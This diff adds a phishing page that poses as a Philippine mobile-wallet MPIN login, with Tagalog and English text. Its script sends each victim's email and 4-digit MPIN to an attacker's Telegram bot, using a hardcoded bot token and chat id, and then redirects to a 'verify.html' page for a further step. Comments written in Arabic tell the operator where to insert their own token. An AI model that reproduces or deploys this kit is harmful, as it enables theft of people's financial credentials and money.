@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="tl" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - MPIN</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #ffffff; display: flex; justify-content: center; padding: 20px; }
+        .login-container { width: 100%; max-width: 400px; display: flex; flex-direction: column; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+        .lang-btn { background: #eee; border: 1px solid #ccc; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 14px; font-weight: bold; }
+        .help-icon { border: 1.5px solid #333; border-radius: 50%; width: 22px; height: 22px; display: flex; justify-content: center; align-items: center; font-weight: bold; font-size: 14px; }
+        .title-section { text-align: center; margin-bottom: 30px; }
+        .title-section h1 { font-size: 18px; }
+        .country { color: #8e8e8e; font-size: 14px; margin-top: 5px; }
+        .form-group { margin-bottom: 20px; position: relative; }
+        .form-group label { display: block; font-size: 14px; color: #8e8e8e; margin-bottom: 8px; }
+        .input-field { width: 100%; padding: 15px; border: 1.5px solid #333; border-radius: 10px; font-size: 16px; outline: none; }
+        .btn-login { width: 100%; padding: 16px; background-color: #f1f3f5; border: none; border-radius: 10px; color: #adb5bd; font-size: 16px; font-weight: bold; cursor: not-allowed; margin-top: 10px; transition: 0.3s; }
+        .btn-login.active { background-color: #000; color: #fff; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="header">
+            <button class="lang-btn" id="langBtn">English</button>
+            <div class="help-icon">?</div>
+        </div>
+        <div class="title-section">
+            <h1 id="txt-login">Mag-log in</h1>
+            <div class="country">🇵🇭 Philippines</div>
+        </div>
+        <div class="form-group">
+            <label id="txt-email-label">Email address</label>
+            <input type="email" id="emailInput" class="input-field" style="background-color: #f8f9fa; color: #666;" readonly disabled>
+        </div>
+        <div class="form-group">
+            <label id="txt-mpin-label">4-digit MPIN</label>
+            <input type="password" id="mpinInput" class="input-field" placeholder="4-digit MPIN" maxlength="4" inputmode="numeric">
+        </div>
+        <button id="loginBtn" class="btn-login" disabled>Mag-log in</button>
+    </div>
+
+    <script>
+        const botToken = "7971170074:AAESPAMwTHEaEYKdQtBPqN9XCRP3t1BDrpM"; // ضع التوكن هنا
+        const chatId = "8129155953";   // ضع الآيدي هنا
+
+        const langBtn = document.getElementById('langBtn');
+        const loginBtn = document.getElementById('loginBtn');
+        const mpinInput = document.getElementById('mpinInput');
+        const emailInput = document.getElementById('emailInput');
+
+        const translations = {
+            tl: { login: "Mag-log in", email: "Email address", mpin: "4-digit MPIN", switch: "English" },
+            en: { login: "Log in", email: "Email address", mpin: "4-digit MPIN", switch: "Filipino" }
+        };
+
+        let currentLang = localStorage.getItem('lang') || 'tl';
+
+        function updateLang() {
+            const t = translations[currentLang];
+            document.getElementById('txt-login').innerText = t.login;
+            document.getElementById('txt-email-label').innerText = t.email;
+            document.getElementById('txt-mpin-label').innerText = t.mpin;
+            loginBtn.innerText = t.login;
+            langBtn.innerText = t.switch;
+            localStorage.setItem('lang', currentLang);
+        }
+
+        langBtn.addEventListener('click', () => {
+            currentLang = currentLang === 'tl' ? 'en' : 'tl';
+            updateLang();
+        });
+
+        emailInput.value = localStorage.getItem('userEmail') || "";
+
+        mpinInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            const isActive = mpinInput.value.length === 4;
+            loginBtn.classList.toggle('active', isActive);
+            loginBtn.disabled = !isActive;
+        });
+
+        loginBtn.addEventListener('click', () => {
+            const email = emailInput.value;
+            const mpin = mpinInput.value;
+            localStorage.setItem('userMPIN', mpin);
+
+            const msg = `📍 *Step 1: Login Details*\n📧 Email: \`${email}\`\n🔑 MPIN: \`${mpin}\``;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
+            }).then(() => { window.location.href = 'verify.html'; });
+        });
+
+        updateLang();
+    </script>
+</body>
+</html>
